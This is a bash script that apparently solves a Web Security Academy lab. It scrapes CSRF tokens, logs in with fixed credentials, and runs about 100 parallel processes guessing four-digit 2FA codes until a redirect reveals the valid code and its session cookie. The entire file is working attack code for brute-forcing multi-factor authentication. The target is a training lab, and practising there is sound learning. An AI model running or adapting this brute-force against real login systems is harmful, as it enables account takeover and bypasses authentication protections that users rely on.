#!/bin/bash

subdomain=0a0a00f003d4a179c0001c95006c00cc
URL="https://${subdomain}.web-security-academy.net/login"
URL2="https://${subdomain}.web-security-academy.net/login2"
header="Content-Type: application/x-www-form-urlencoded"

username="username=carlos"
password="password=montoya"

cookiefile="./cookies/cookie"

echo "${URL}"
echo "${URL2}"
echo "${header}"

# Clean
rm ./file*
rm ./cookies/*

# First GET /login to get the session cookie and the value 
# Hidden inside the input form

function get_csrf() {	
	# Take text between 'csrf" value="' and the '">' string
	csrf="csrf=$( echo "$1" | grep -Po '(?<=(csrf" value=")).*(?=">)' )"
	echo "${csrf}"
}


function check_2FA() {
	i=$(( $1%(maxProcess*3) )) 
	# GET request to /login
	response=$(curl -s -c "${cookiefile}$i" "${URL}")
	csrf=$(get_csrf "${response}")

	# echo "First csrf and session cookies pair"
	# echo "${csrf} | $(cat "${cookiefile}$i" | grep -Po 'session.{0,38}')"

	# POST request to /login with GET redirection to /login2
	response=$(curl -s -L "${URL}" -b "${cookiefile}$i" -c "${cookiefile}$i" -H "${header}"\
			--data-raw "${csrf}&${username}&${password}")
	csrf=$(get_csrf "${response}") 
	
	# echo "Second csrf and session cookies pair"
	# echo "${csrf} | $(cat "${cookiefile}$i" | grep -Po 'session.{0,38}')"

	# Luck you can do it!
	guess=$( shuf -i 0-9999 -n 1 )
	guess=$(printf "%04d\n" $guess)
	mfa_code="mfa-code=${guess}"

	response=$(curl -s "${URL2}" -w "%{http_code}\n%{time_total}" -b "${cookiefile}$i" -c "${cookiefile}$i_2FA" -H "${header}"\
		--data-raw "${csrf}&${mfa_code}")


	status_code=$(tail -n2 <<< "${response}" | head -n1)
	total_time=$(tail -n1 <<< "${response}")
	content=$(head -n -2 <<< "${response}")
	stats=($(echo "${content}" | wc))

	number=$(printf "%05d\n" $1)

	if (( $(ls | grep -c "file") == 0 )); then
		echo "$number | ${status_code} | time:${total_time} | bytes:${stats[2]} | words:${stats[1]} | lines:${stats[0]} | guess:${guess}"
	fi

	if (( $status_code == '302' )); then
		echo "Found it! use: ${guess}"
		echo "${response}" > file${guess}.html
		echo "${csrf} | $(cat "${cookiefile}$i_2FA" | grep -Po 'session.{0,38}')"
	fi
}

total=30000
maxProcess=100
for i in $(seq 0 $total); do
	while (( $(jobs | wc -l) > $maxProcess )); do
		wait
	done

	if (( $(ls | grep -c "file") > 0)); then
		break
	fi

	# To avoid  files conflicts the 100 process will be 
	# use a range o x3 files
	check_2FA $i &

	echo -ne "Attemp ${i}/${total} \r"
done




